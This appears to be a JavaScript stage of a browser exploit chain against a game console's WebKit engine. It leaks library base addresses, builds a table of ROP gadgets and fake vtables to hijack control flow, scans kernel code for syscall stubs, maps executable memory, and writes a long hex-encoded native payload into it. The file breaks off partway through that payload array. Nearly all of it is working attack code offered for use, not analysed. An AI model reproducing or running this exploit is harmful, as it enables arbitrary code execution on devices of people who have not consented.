var p;
var chain;
var nogc = [];
var webKitBase;
var libSceLibcInternalBase;
var libKernelBase;

const OFFSET_WK_vtable_first_element    = 0x009A6040;
const OFFSET_WK_memset_import           = 0x00002458;
const OFFSET_WK___stack_chk_fail_import = 0x00002438;
const OFFSET_WK_setjmp_gadget_one       = 0x006D81F5;
const OFFSET_WK_setjmp_gadget_two       = 0x00288F83;
const OFFSET_WK_longjmp_gadget_one      = 0x006D81F5;
const OFFSET_WK_longjmp_gadget_two      = 0x00288F83;



const OFFSET_libcint_memset             = 0x000507D0;
const OFFSET_libcint_setjmp             = 0x000BE39C;
const OFFSET_libcint_longjmp            = 0x000BE3F6;

const OFFSET_lk___stack_chk_fail        = 0x00012AD0;
const OFFSET_lk_pthread_create_name_np  = 0x0001BB10;
const OFFSET_lk_pthread_exit            = 0x00019FD0;
const OFFSET_lk_pthread_self            = 0x0001D160;
const OFFSET_lk_pthread_setschedparam   = 0x0002AD70;

var syscalls = {};
var gadgets = {};
var gadgetmap = {
  "ret": 0x0000003C,
  "pop rdi": 0x0000835D,
  "pop rsi": 0x0003C987,
  "pop rdx": 0x00052B23,
  "pop rcx": 0x00026AFB,
  "pop r8": 0x00097D32,
  "pop r9": 0x005C6A81,
  "pop rax": 0x0001FA68,
  "pop rsp": 0x00078C62,

  "mov [rdi], rax": 0x000203E9,
  "mov [rdi], eax": 0x00020148,
  "mov [rdi], rsi": 0x000359F0,
  "cmp [rcx], edi": 0x0010DA31,

  "setne al": 0x00009000,
  "sete al": 0x0001E0C4,
  "setle al": 0x000CA7F6,
  "setl al": 0x005955AC,
  "setge al": 0x0061B262,
  "setg al": 0x000E4A37,
  "shl rax, 3": 0x005E8953,
  "add rax, rdx": 0x003D498C,
  "mov rax, [rax]": 0x0002E852,
  "inc dword [rax]": 0x003628DB,
  "infpoop": 0x0001386A
};

var textArea = document.createElement("textarea");

function stage2() {
  p = window.prim;
  p.launch_chain = launch_chain;
  p.malloc = malloc;
  p.malloc32 = malloc32;
  p.stringify = stringify;
  p.readString = readString;
  p.array_from_address = array_from_address;

  //pointer to vtable address
  var textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
  //address of vtable
  var textAreaVtable = p.read8(textAreaVtPtr);
  //use address of 1st entry (in .text) to calculate webkitbase
  webKitBase = p.read8(textAreaVtable).sub32(OFFSET_WK_vtable_first_element);

  libSceLibcInternalBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_memset_import)));
  libSceLibcInternalBase.sub32inplace(OFFSET_libcint_memset);

  libKernelBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK___stack_chk_fail_import)));
  libKernelBase.sub32inplace(OFFSET_lk___stack_chk_fail);

  for (var gadget in gadgetmap) {
    window.gadgets[gadget] = webKitBase.add32(gadgetmap[gadget]);
  }

  function get_jmptgt(address) {
    var instr = p.read4(address) & 0xFFFF;
    var offset = p.read4(address.add32(2));
    if (instr != 0x25FF) {
      return 0;
    }
    return address.add32(0x6 + offset);
  }

  function malloc(sz) {
    var backing = new Uint8Array(0x10000 + sz);
    window.nogc.push(backing);
    var ptr = p.read8(p.leakval(backing).add32(0x10));
    ptr.backing = backing;
    return ptr;
  }

  function malloc32(sz) {
    var backing = new Uint8Array(0x10000 + sz * 4);
    window.nogc.push(backing);
    var ptr = p.read8(p.leakval(backing).add32(0x10));
    ptr.backing = new Uint32Array(backing.buffer);
    return ptr;
  }

  function array_from_address(addr, size) {
    var og_array = new Uint32Array(0x1000);
    var og_array_i = p.leakval(og_array).add32(0x10);

    p.write8(og_array_i, addr);
    p.write4(og_array_i.add32(8), size);

    nogc.push(og_array);
    return og_array;
  }

  function stringify(str) {
    var bufView = new Uint8Array(str.length + 1);
    for (var i = 0; i < str.length; i++) {
      bufView[i] = str.charCodeAt(i) & 0xFF;
    }
    window.nogc.push(bufView);
    return p.read8(p.leakval(bufView).add32(0x10));
  }
  function readString(addr)
  {
    var byte = p.read4(addr);
    var str  = "";
    var i = 0;
    while (byte & 0xFF)
    {
      str += String.fromCharCode(byte & 0xFF);
      byte = p.read4(addr.add32(i));
      i++;
    }
    return str;
  }



  var fakeVtable_setjmp = p.malloc32(0x200);
  var fakeVtable_longjmp = p.malloc32(0x200);
  var original_context = p.malloc32(0x40);
  var modified_context = p.malloc32(0x40);

  p.write8(fakeVtable_setjmp.add32(0x0), fakeVtable_setjmp);
  p.write8(fakeVtable_setjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_setjmp_gadget_two)); // mov rdi, qword ptr [rdi + 0x10] ; jmp qword ptr [rax + 8]
  p.write8(fakeVtable_setjmp.add32(0x10), original_context);
  p.write8(fakeVtable_setjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_setjmp));
  p.write8(fakeVtable_setjmp.add32(0x1D8), webKitBase.add32(OFFSET_WK_setjmp_gadget_one)); // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]

  p.write8(fakeVtable_longjmp.add32(0x0), fakeVtable_longjmp);
  p.write8(fakeVtable_longjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_longjmp_gadget_two)); // mov rdi, qword ptr [rdi + 0x10] ; jmp qword ptr [rax + 8]
  p.write8(fakeVtable_longjmp.add32(0x10), modified_context);
  p.write8(fakeVtable_longjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));
  p.write8(fakeVtable_longjmp.add32(0x1D8), webKitBase.add32(OFFSET_WK_longjmp_gadget_one)); // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]

  function launch_chain(chain) {

    chain.push(window.gadgets["pop rdi"]);
    chain.push(original_context);
    chain.push(libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));

    p.write8(textAreaVtPtr, fakeVtable_setjmp);
    textArea.scrollLeft = 0x0;
    p.write8(modified_context.add32(0x00), window.gadgets["ret"]);
    p.write8(modified_context.add32(0x10), chain.stack);
    p.write8(modified_context.add32(0x40), p.read8(original_context.add32(0x40)))

    p.write8(textAreaVtPtr, fakeVtable_longjmp);
    textArea.scrollLeft = 0x0;
    p.write8(textAreaVtPtr, textAreaVtable);
  }

  var kview = new Uint8Array(0x1000);
  var kstr = p.leakval(kview).add32(0x10);
  var orig_kview_buf = p.read8(kstr);

  p.write8(kstr, window.libKernelBase);
  p.write4(kstr.add32(8), 0x40000);
  var countbytes;

  for (var i = 0; i < 0x40000; i++) {
    if (kview[i] == 0x72 && kview[i + 1] == 0x64 && kview[i + 2] == 0x6c && kview[i + 3] == 0x6f && kview[i + 4] == 0x63) {
      countbytes = i;
      break;
    }
  }
  p.write4(kstr.add32(8), countbytes + 32);
  var dview32 = new Uint32Array(1);
  var dview8 = new Uint8Array(dview32.buffer);
  for (var i = 0; i < countbytes; i++) {
    if (kview[i] == 0x48 && kview[i + 1] == 0xc7 && kview[i + 2] == 0xc0 && kview[i + 7] == 0x49 && kview[i + 8] == 0x89 && kview[i + 9] == 0xca && kview[i + 10] == 0x0f && kview[i + 11] == 0x05) {
      dview8[0] = kview[i + 3];
      dview8[1] = kview[i + 4];
      dview8[2] = kview[i + 5];
      dview8[3] = kview[i + 6];
      var syscallno = dview32[0];
      window.syscalls[syscallno] = window.libKernelBase.add32(i);
    }
  }
  p.write8(kstr, orig_kview_buf);
  chain = new rop();
  if (chain.syscall(23, 0).low != 0x0) {
    try {
      stage3();
    } catch (e) {
      alert(e);
    }
  } 
    
  var payload_buffer = chain.syscall(477, new int64(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
  var payload_writer = p.array_from_address(payload_buffer, 0xC0000);

  payload_writer[0] = 0x001a1fe9;
  payload_writer[1] = 0x55544100;
  payload_writer[2] = 0x0082b953;
  payload_writer[3] = 0x8148c000;
  payload_writer[4] = 0x000130ec;
  payload_writer[5] = 0xf5894800;
  payload_writer[6] = 0xc148320f;
  payload_writer[7] = 0xc74820e2;
  payload_writer[8] = 0x66382444;
  payload_writer[9] = 0x48000006;
  payload_writer[10] = 0x44c6d009;
  payload_writer[11] = 0xc67f1024;
  payload_writer[12] = 0x45112444;
  payload_writer[13] = 0x24748d48;
  payload_writer[14] = 0x2444c610;
  payload_writer[15] = 0x8d484c12;
  payload_writer[16] = 0xfffe40b8;
  payload_writer[17] = 0x2444c6ff;
  payload_writer[18] = 0x04ba4613;
  payload_writer[19] = 0x48000000;
  payload_writer[20] = 0x08244c89;
  payload_writer[21] = 0x50de15ff;
  payload_writer[22] = 0x8b4c0000;
  payload_writer[23] = 0x0050d705;
  payload_writer[24] = 0x48c08500;
  payload_writer[25] = 0x08244c8b;
  payload_writer[26] = 0x0589850f;
  payload_writer[27] = 0x320f0000;
  payload_writer[28] = 0x20e2c148;
  payload_writer[29] = 0x402444c6;
  payload_writer[30] = 0xd3894855;
  payload_writer[31] = 0x412444c6;
  payload_writer[32] = 0xc3094848;
  payload_writer[33] = 0x422444c6;
  payload_writer[34] = 0x2444c689;
  payload_writer[35] = 0x8d48e543;
  payload_writer[36] = 0xc6402474;
  payload_writer[37] = 0x53442444;
  payload_writer[38] = 0x70bb8d48;
  payload_writer[39] = 0xc6000bc5;
  payload_writer[40] = 0x48452444;
  payload_writer[41] = 0x00000cba;
  payload_writer[42] = 0x2444c600;
  payload_writer[43] = 0x8d4c8346;
  payload_writer[44] = 0xfffe40a3;
  payload_writer[45] = 0x2444c6ff;
  payload_writer[46] = 0x44c6ec47;
  payload_writer[47] = 0xc6584824;
  payload_writer[48] = 0x48492444;
  payload_writer[49] = 0x4a2444c6;
  payload_writer[50] = 0x2444c68d;
  payload_writer[51] = 0xff411d4b;
  payload_writer[52] = 0x75c085d0;
  payload_writer[53] = 0x44c74815;
  payload_writer[54] = 0x07003824;
  payload_writer[55] = 0x8d480000;
  payload_writer[56] = 0x02ef8083;
  payload_writer[57] = 0x0d4ee900;
  payload_writer[58] = 0x44c60000;
  payload_writer[59] = 0x48554c24;
  payload_writer[60] = 0x4c24748d;
  payload_writer[61] = 0x4d2444c6;
  payload_writer[62] = 0xbb8d4848;
  payload_writer[63] = 0x001230c0;
  payload_writer[64] = 0x4e2444c6;
  payload_writer[65] = 0x000cba89;
  payload_writer[66] = 0x44c60000;
  payload_writer[67] = 0xc6e54f24;
  payload_writer[68] = 0x53502444;
  payload_writer[69] = 0x512444c6;
  payload_writer[70] = 0x2444c648;
  payload_writer[71] = 0x44c68352;
  payload_writer[72] = 0xc6ec5324;
  payload_writer[73] = 0x58542444;
  payload_writer[74] = 0x552444c6;
  payload_writer[75] = 0x2444c648;
  payload_writer[76] = 0x44c68d56;
  payload_writer[77] = 0xff1d5724;
  payload_writer[78] = 0x004ffb15;
  payload_writer[79] = 0x75c08500;
  payload_writer[80] = 0x44c74815;
  payload_writer[81] = 0x06703824;
  payload_writer[82] = 0x8d480000;
  payload_writer[83] = 0x3c14f083;
  payload_writer[84] = 0x0ce2e900;
  payload_writer[85] = 0x44c60000;
  payload_writer[86] = 0x48555824;
  payload_writer[87] = 0x5824748d;
  payload_writer[88] = 0x592444c6;
  payload_writer[89] = 0xbb8d4848;
  payload_writer[90] = 0x00122d10;
  payload_writer[91] = 0x5a2444c6;
  payload_writer[92] = 0x000cba89;
  payload_writer[93] = 0x44c60000;
  payload_writer[94] = 0xc6e55b24;
  payload_writer[95] = 0x535c2444;
  payload_writer[96] = 0x5d2444c6;
  payload_writer[97] = 0x2444c648;
  payload_writer[98] = 0x44c6835e;
  payload_writer[99] = 0xc6ec5f24;
  payload_writer[100] = 0x58602444;
  payload_writer[101] = 0x612444c6;
  payload_writer[102] = 0x2444c648;
  payload_writer[103] = 0x44c68d62;
  payload_writer[104] = 0xff1d6324;
  payload_writer[105] = 0x004f8f15;
  payload_writer[106] = 0x75c08500;
  payload_writer[107] = 0x44c74815;
  payload_writer[108] = 0x06503824;
  payload_writer[109] = 0x8d480000;
  payload_writer[110] = 0x3c114083;
  payload_writer[111] = 0x0c76e900;
  payload_writer[112] = 0x44c60000;
  payload_writer[113] = 0x48556424;
  payload_writer[114] = 0x6424748d;
  payload_writer[115] = 0x652444c6;
  payload_writer[116] = 0xbb8d4848;
  payload_writer[117] = 0x00307c50;
  payload_writer[118] = 0x662444c6;
  payload_writer[119] = 0x000cba89;
  payload_writer[120] = 0x44c60000;
  payload_writer[121] = 0xc6e56724;
  payload_writer[122] = 0x53682444;
  payload_writer[123] = 0x692444c6;
  payload_writer[124] = 0x2444c648;
  payload_writer[125] = 0x44c6836a;
  payload_writer[126] = 0xc6ec6b24;
  payload_writer[127] = 0x586c2444;
  payload_writer[128] = 0x6d2444c6;
  payload_writer[129] = 0x2444c648;
  payload_writer[130] = 0x44c68d6e;
  payload_writer[131] = 0xff1d6f24;
  payload_writer[132] = 0x004f2315;
  payload_writer[133] = 0x75c08500;
  payload_writer[134] = 0x44c7480b;
  payload_writer[135] = 0x06203824;
  payload_writer[136] = 0x60eb0000;
  payload_writer[137] = 0x702444c6;
  payload_writer[138] = 0x748d4855;
  payload_writer[139] = 0x44c67024;
  payload_writer[140] = 0x48487124;
  payload_writer[141] = 0x7c30bb8d;
  payload_writer[142] = 0x44c60030;
  payload_writer[143] = 0xba897224;
  payload_writer[144] = 0x0000000c;
  payload_writer[145] = 0x732444c6;
  payload_writer[146] = 0x2444c6e5;
  payload_writer[147] = 0x44c65374;
  payload_writer[148] = 0xc6487524;
  payload_writer[149] = 0x83762444;
  payload_writer[150] = 0x772444c6;
  payload_writer[151] = 0x2444c6ec;
  payload_writer[152] = 0x44c65878;
  payload_writer[153] = 0xc6487924;
  payload_writer[154] = 0x8d7a2444;
  payload_writer[155] = 0x7b2444c6;
  payload_writer[156] = 0xc115ff1d;
  payload_writer[157] = 0x8500004e;
  payload_writer[158] = 0x481575c0;
  payload_writer[159] = 0x382444c7;
  payload_writer[160] = 0x00000600;
  payload_writer[161] = 0x40838d48;
  payload_writer[162] = 0xe9001146;
  payload_writer[163] = 0x00000ba8;
  payload_writer[164] = 0x7c2444c6;
  payload_writer[165] = 0x748d4855;
  payload_writer[166] = 0x44c67c24;
  payload_writer[167] = 0x48487d24;
  payload_writer[168] = 0xaf90bb8d;
  payload_writer[169] = 0x44c60011;
  payload_writer[170] = 0xba897e24;
  payload_writer[171] = 0x0000000c;
  payload_writer[172] = 0x7f2444c6;
  payload_writer[173] = 0x2484c6e5;
  payload_writer[174] = 0x00000080;
  payload_writer[175] = 0x2484c653;
  payload_writer[176] = 0x00000081;
  payload_writer[177] = 0x2484c648;
  payload_writer[178] = 0x00000082;
  payload_writer[179] = 0x2484c683;
  payload_writer[180] = 0x00000083;
  payload_writer[181] = 0x2484c6ec;
  payload_writer[182] = 0x00000084;
  payload_writer[183] = 0x2484c658;
  payload_writer[184] = 0x00000085;
  payload_writer[185] = 0x2484c648;
  payload_writer[186] = 0x00000086;
  payload_writer[187] = 0x2484c68d;
  payload_writer[188] = 0x00000087;
  payload_writer[189] = 0x3d15ff1d;
  payload_writer[190] = 0x8500004e;
  payload_writer[191] = 0x481575c0;
  payload_writer[192] = 0x382444c7;
  payload_writer[193] = 0x00000555;
  payload_writer[194] = 0xc0838d48;
  payload_writer[195] = 0xe900405b;
  payload_writer[196] = 0x00000b24;
  payload_writer[197] = 0x882484c6;
  payload_writer[198] = 0x55000000;
  payload_writer[199] = 0x24b48d48;
  payload_writer[200] = 0x00000088;
  payload_writer[201] = 0x892484c6;
  payload_writer[202] = 0x48000000;
  payload_writer[203] = 0x20bb8d48;
  payload_writer[204] = 0xc60011ac;
  payload_writer[205] = 0x008a2484;
  payload_writer[206] = 0xba890000;
  payload_writer[207] = 0x0000000c;
  payload_writer[208] = 0x8b2484c6;
  payload_writer[209] = 0xe5000000;
  payload_writer[210] = 0x8c2484c6;
  payload_writer[211] = 0x53000000;
  payload_writer[212] = 0x8d2484c6;
  payload_writer[213] = 0x48000000;
  payload_writer[214] = 0x8e2484c6;
  payload_writer[215] = 0x83000000;
  payload_writer[216] = 0x8f2484c6;
  payload_writer[217] = 0xec000000;
  payload_writer[218] = 0x902484c6;
  payload_writer[219] = 0x58000000;
  payload_writer[220] = 0x912484c6;
  payload_writer[221] = 0x48000000;
  payload_writer[222] = 0x922484c6;
  payload_writer[223] = 0x8d000000;
  payload_writer[224] = 0x932484c6;
  payload_writer[225] = 0x1d000000;
  payload_writer[226] = 0x4daa15ff;
  payload_writer[227] = 0xc0850000;
  payload_writer[228] = 0xc7481575;
  payload_writer[229] = 0x53382444;
  payload_writer[230] = 0x48000005;
  payload_writer[231] = 0x5800838d;
  payload_writer[232] = 0x91e90040;
  payload_writer[233] = 0xc600000a;
  payload_writer[234] = 0x00942484;
  payload_writer[235] = 0x48550000;
  payload_writer[236] = 0x9424b48d;
  payload_writer[237] = 0xc6000000;
  payload_writer[238] = 0x00952484;
  payload_writer[239] = 0x48480000;
  payload_writer[240] = 0xac50bb8d;
  payload_writer[241] = 0x84c60011;
  payload_writer[242] = 0x00009624;
  payload_writer[243] = 0x0cba8900;
  payload_writer[244] = 0xc6000000;
  payload_writer[245] = 0x00972484;
  payload_writer[246] = 0xc6e50000;
  payload_writer[247] = 0x00982484;
  payload_writer[248] = 0xc6530000;
  payload_writer[249] = 0x00992484;
  payload_writer[250] = 0xc6480000;
  payload_writer[251] = 0x009a2484;
  payload_writer[252] = 0xc6830000;
  payload_writer[253] = 0x009b2484;
  payload_writer[254] = 0xc6ec0000;
  payload_writer[255] = 0x009c2484;
  payload_writer[256] = 0xc6580000;
  payload_writer[257] = 0x009d2484;
  payload_writer[258] = 0xc6480000;
  payload_writer[259] = 0x009e2484;
  payload_writer[260] = 0xc68d0000;
  payload_writer[261] = 0x009f2484;
  payload_writer[262] = 0xff1d0000;
  payload_writer[263] = 0x004d1715;
  payload_writer[264] = 0x75c08500;
  payload_writer[265] = 0x44c74815;
  payload_writer[266] = 0x05503824;
  payload_writer[267] = 0x8d480000;
  payload_writer[268] = 0x40590083;
  payload_writer[269] = 0x09fee900;
  payload_writer[270] = 0x84c60000;
  payload_writer[271] = 0x0000a024;
  payload_writer[272] = 0x8d485500;
  payload_writer[273] = 0x00a024b4;
  payload_writer[274] = 0x84c60000;
  payload_writer[275] = 0x0000a124;
  payload_writer[276] = 0x8d484800;
  payload_writer[277] = 0x435e80bb;
  payload_writer[278] = 0x2484c600;
  payload_writer[279] = 0x000000a2;
  payload_writer[280] = 0x000cba89;
  payload_writer[281] = 0x84c60000;
  payload_writer[282] = 0x0000a324;
  payload_writer[283] = 0x84c6e500;
  payload_writer[284] = 0x0000a424;
  payload_writer[285] = 0x84c65300;
  payload_writer[286] = 0x0000a524;
  payload_writer[287] = 0x84c64800;
  payload_writer[288] = 0x0000a624;
  payload_writer[289] = 0x84c68300;
  payload_writer[290] = 0x0000a724;
  payload_writer[291] = 0x84c6ec00;
  payload_writer[292] = 0x0000a824;
  payload_writer[293] = 0x84c65800;
  payload_writer[294] = 0x0000a924;
  payload_writer[295] = 0x84c64800;
  payload_writer[296] = 0x0000aa24;
  payload_writer[297] = 0x84c68d00;
  payload_writer[298] = 0x0000ab24;
  payload_writer[299] = 0x15ff1d00;
  payload_writer[300] = 0x00004c84;
  payload_writer[301] = 0x0e75c085;
  payload_writer[302] = 0x2444c748;
  payload_writer[303] = 0x00050538;
  payload_writer[304] = 0x0088e900;
  payload_writer[305] = 0x84c60000;
  payload_writer[306] = 0x0000ac24;
  payload_writer[307] = 0x8d485500;
  payload_writer[308] = 0x00ac24b4;
  payload_writer[309] = 0x84c60000;
  payload_writer[310] = 0x0000ad24;
  payload_writer[311] = 0x8d494800;
  payload_writer[312] = 0x600024bc;
  payload_writer[313] = 0x84c60043;
  payload_writer[314] = 0x0000ae24;
  payload_writer[315] = 0x0cba8900;
  payload_writer[316] = 0xc6000000;
  payload_writer[317] = 0x00af2484;
  payload_writer[318] = 0xc6e50000;
  payload_writer[319] = 0x00b02484;
  payload_writer[320] = 0xc6530000;
  payload_writer[321] = 0x00b12484;
  payload_writer[322] = 0xc6480000;
  payload_writer[323] = 0x00b22484;
  payload_writer[324] = 0xc6830000;
  payload_writer[325] = 0x00b32484;
  payload_writer[326] = 0xc6ec0000;
  payload_writer[327] = 0x00b42484;
  payload_writer[328] = 0xc6580000;
  payload_writer[329] = 0x00b52484;
  payload_writer[330] = 0xc6480000;
  payload_writer[331] = 0x00b62484;
  payload_writer[332] = 0xc68d0000;
  payload_writer[333] = 0x00b72484;
  payload_writer[334] = 0xff1d0000;
  payload_writer[335] = 0x004bf715;
  payload_writer[336] = 0x75c08500;
  payload_writer[337] = 0x44c74816;
  payload_writer[338] = 0x05033824;
  payload_writer[339] = 0x8d490000;
  payload_writer[340] = 0xa6302484;
  payload_writer[341] = 0xdde9001e;
  payload_writer[342] = 0xc6000008;
  payload_writer[343] = 0x00b82484;
  payload_writer[344] = 0x48550000;
  payload_writer[345] = 0xb824b48d;
  payload_writer[346] = 0xc6000000;
  payload_writer[347] = 0x00b92484;
  payload_writer[348] = 0x49480000;
  payload_writer[349] = 0x7024bc8d;
  payload_writer[350] = 0xc600435c;
  payload_writer[351] = 0x00ba2484;
  payload_writer[352] = 0xba890000;
  payload_writer[353] = 0x0000000c;
  payload_writer[354] = 0xbb2484c6;
  payload_writer[355] = 0xe5000000;
  payload_writer[356] = 0xbc2484c6;
  payload_writer[357] = 0x53000000;
  payload_writer[358] = 0xbd2484c6;
  payload_writer[359] = 0x48000000;
  payload_writer[360] = 0xbe2484c6;
  payload_writer[361] = 0x83000000;
  payload_writer[362] = 0xbf2484c6;
  payload_writer[363] = 0xec000000;
  payload_writer[364] = 0xc02484c6;
  payload_writer[365] = 0x58000000;
  payload_writer[366] = 0xc12484c6;
  payload_writer[367] = 0x48000000;
  payload_writer[368] = 0xc22484c6;
  payload_writer[369] = 0x8d000000;
  payload_writer[370] = 0xc32484c6;
  payload_writer[371] = 0x1d000000;
  payload_writer[372] = 0x4b6215ff;
  payload_writer[373] = 0xc0850000;
  payload_writer[374] = 0xc0310774;
  payload_writer[375] = 0x000857e9;
  payload_writer[376] = 0x44c74800;
  payload_writer[377] = 0x05003824;
  payload_writer[378] = 0x8d490000;
  payload_writer[379] = 0xa5202484;
  payload_writer[380] = 0x41e9001e;
  payload_writer[381] = 0x0f000008;
  payload_writer[382] = 0xe2c14832;
  payload_writer[383] = 0x2444c620;
  payload_writer[384] = 0x09487f14;
  payload_writer[385] = 0x2444c6d0;
  payload_writer[386] = 0x44c64515;
  payload_writer[387] = 0x484c1624;
  payload_writer[388] = 0x1424748d;
  payload_writer[389] = 0x172444c6;
  payload_writer[390] = 0xb88d4846;
  payload_writer[391] = 0xffcf47c0;
  payload_writer[392] = 0x244c8948;
  payload_writer[393] = 0x0004ba08;
  payload_writer[394] = 0xff410000;
  payload_writer[395] = 0x058b4cd0;
  payload_writer[396] = 0x00004b04;
  payload_writer[397] = 0x8b48c085;
  payload_writer[398] = 0x0f08244c;
  payload_writer[399] = 0x00009d85;
  payload_writer[400] = 0x48320f00;
  payload_writer[401] = 0xc620e2c1;
  payload_writer[402] = 0x00c42484;
  payload_writer[403] = 0x48550000;
  payload_writer[404] = 0x84c6d009;
  payload_writer[405] = 0x0000c524;
  payload_writer[406] = 0x8d484800;
  payload_writer[407] = 0xcf47c098;
  payload_writer[408] = 0x2484c6ff;
  payload_writer[409] = 0x000000c6;
  payload_writer[410] = 0x2484c689;
  payload_writer[411] = 0x000000c7;
  payload_writer[412] = 0xb48d48e5;
  payload_writer[413] = 0x0000c424;
  payload_writer[414] = 0x2484c600;
  payload_writer[415] = 0x000000c8;
  payload_writer[416] = 0xbb8d4853;
  payload_writer[417] = 0x00017f30;
  payload_writer[418] = 0xc92484c6;
  payload_writer[419] = 0x48000000;
  payload_writer[420] = 0x00000cba;
  payload_writer[421] = 0x2484c600;
  payload_writer[422] = 0x000000ca;
  payload_writer[423] = 0x2484c683;
  payload_writer[424] = 0x000000cb;
  payload_writer[425] = 0x2484c6ec;
  payload_writer[426] = 0x000000cc;
  payload_writer[427] = 0x2484c658;
  payload_writer[428] = 0x000000cd;
  payload_writer[429] = 0x2484c648;
  payload_writer[430] = 0x000000ce;
  payload_writer[431] = 0x2484c68d;
  payload_writer[432] = 0x000000cf;
  payload_writer[433] = 0xd0ff411d;
  payload_writer[434] = 0x850fc085;
  payload_writer[435] = 0xffffff0a;
  payload_writer[436] = 0x2444c748;
  payload_writer[437] = 0x00047038;
  payload_writer[438] = 0x00e2e900;
  payload_writer[439] = 0x320f0000;
  payload_writer[440] = 0x20e2c148;
  payload_writer[441] = 0x182444c6;
  payload_writer[442] = 0xd009487f;
  payload_writer[443] = 0x192444c6;
  payload_writer[444] = 0x2444c645;
  payload_writer[445] = 0x8d484c1a;
  payload_writer[446] = 0xc6182474;
  payload_writer[447] = 0x461b2444;
  payload_writer[448] = 0x30b88d48;
  payload_writer[449] = 0x48ffcf48;
  payload_writer[450] = 0x08244c89;
  payload_writer[451] = 0x000004ba;
  payload_writer[452] = 0xd0ff4100;
  payload_writer[453] = 0x1d058b4c;
  payload_writer[454] = 0x8500004a;
  payload_writer[455] = 0x4c8b48c0;
  payload_writer[456] = 0x850f0824;
  payload_writer[457] = 0x000000a4;
  payload_writer[458] = 0xc148320f;
  payload_writer[459] = 0x84c620e2;
  payload_writer[460] = 0x0000d024;
  payload_writer[461] = 0x09485500;
  payload_writer[462] = 0x2484c6d0;
  payload_writer[463] = 0x000000d1;
  payload_writer[464] = 0x988d4848;
  payload_writer[465] = 0xffcf4830;
  payload_writer[466] = 0xd22484c6;
  payload_writer[467] = 0x89000000;
  payload_writer[468] = 0xd32484c6;
  payload_writer[469] = 0xe5000000;
  payload_writer[470] = 0x24b48d48;
  payload_writer[471] = 0x000000d0;
  payload_writer[472] = 0xd42484c6;
  payload_writer[473] = 0x53000000;
  payload_writer[474] = 0x30bb8d48;
  payload_writer[475] = 0xc600017f;
  payload_writer[476] = 0x00d52484;
  payload_writer[477] = 0xba480000;
  payload_writer[478] = 0x0000000c;
  payload_writer[479] = 0xd62484c6;
  payload_writer[480] = 0x83000000;
  payload_writer[481] = 0xd72484c6;
  payload_writer[482] = 0xec000000;
  payload_writer[483] = 0xd82484c6;
  payload_writer[484] = 0x58000000;
  payload_writer[485] = 0xd92484c6;
  payload_writer[486] = 0x48000000;
  payload_writer[487] = 0xda2484c6;
  payload_writer[488] = 0x8d000000;
  payload_writer[489] = 0xdb2484c6;
  payload_writer[490] = 0x1d000000;
  payload_writer[491] = 0x85d0ff41;
  payload_writer[492] = 0x23850fc0;
  payload_writer[493] = 0x48fffffe;
  payload_writer[494] = 0x382444c7;
  payload_writer[495] = 0x00000471;
  payload_writer[496] = 0x40838d48;
  payload_writer[497] = 0xe900149e;
  payload_writer[498] = 0x0000066c;
  payload_writer[499] = 0xc148320f;
  payload_writer[500] = 0x44c620e2;
  payload_writer[501] = 0x487f1c24;
  payload_writer[502] = 0x44c6d009;
  payload_writer[503] = 0xc6451d24;
  payload_writer[504] = 0x4c1e2444;
  payload_writer[505] = 0x24748d48;
  payload_writer[506] = 0x2444c61c;
  payload_writer[507] = 0x8d48461f;
  payload_writer[508] = 0xcf6a30b8;
  payload_writer[509] = 0x4c8948ff;
  payload_writer[510] = 0x04ba0824;
  payload_writer[511] = 0x41000000;
  payload_writer[512] = 0x8b4cd0ff;
  payload_writer[513] = 0x00492f05;
  payload_writer[514] = 0x48c08500;
  payload_writer[515] = 0x08244c8b;
  payload_writer[516] = 0x00a4850f;
  payload_writer[517] = 0x320f0000;
  payload_writer[518] = 0x20e2c148;
  payload_writer[519] = 0xdc2484c6;
  payload_writer[520] = 0x55000000;
  payload_writer[521] = 0xc6d00948;
  payload_writer[522] = 0x00dd2484;
  payload_writer[523] = 0x48480000;
  payload_writer[524] = 0x6a30988d;
  payload_writer[525] = 0x84c6ffcf;
  payload_writer[526] = 0x0000de24;
  payload_writer[527] = 0x84c68900;
  payload_writer[528] = 0x0000df24;
  payload_writer[529] = 0x8d48e500;
  payload_writer[530] = 0x00dc24b4;
  payload_writer[531] = 0x84c60000;
  payload_writer[532] = 0x0000e024;
  payload_writer[533] = 0x8d485300;
  payload_writer[534] = 0x017f30bb;
  payload_writer[535] = 0x2484c600;
  payload_writer[536] = 0x000000e1;
  payload_writer[537] = 0x000cba48;
  payload_writer[538] = 0x84c60000;
  payload_writer[539] = 0x0000e224;
  payload_writer[540] = 0x84c68300;
  payload_writer[541] = 0x0000e324;
  payload_writer[542] = 0x84c6ec00;
  payload_writer[543] = 0x0000e424;
  payload_writer[544] = 0x84c65800;
  payload_writer[545] = 0x0000e524;
  payload_writer[546] = 0x84c64800;
  payload_writer[547] = 0x0000e624;
  payload_writer[548] = 0x84c68d00;
  payload_writer[549] = 0x0000e724;
  payload_writer[550] = 0xff411d00;
  payload_writer[551] = 0x0fc085d0;
  payload_writer[552] = 0xfffd3585;
  payload_writer[553] = 0x44c748ff;
  payload_writer[554] = 0x04503824;
  payload_writer[555] = 0x8d480000;
  payload_writer[556] = 0x14a7b083;
  payload_writer[557] = 0x057ee900;
  payload_writer[558] = 0x320f0000;
  payload_writer[559] = 0x20e2c148;
  payload_writer[560] = 0x202444c6;
  payload_writer[561] = 0xd009487f;
  payload_writer[562] = 0x212444c6;
  payload_writer[563] = 0x2444c645;
  payload_writer[564] = 0x8d484c22;
  payload_writer[565] = 0xc6202474;
  payload_writer[566] = 0x46232444;
  payload_writer[567] = 0xc0b88d48;
  payload_writer[568] = 0x48ffcf14;
  payload_writer[569] = 0x08244c89;
  payload_writer[570] = 0x000004ba;
  payload_writer[571] = 0xd0ff4100;
  payload_writer[572] = 0x41058b4c;
  payload_writer[573] = 0x85000048;
  payload_writer[574] = 0x4c8b48c0;
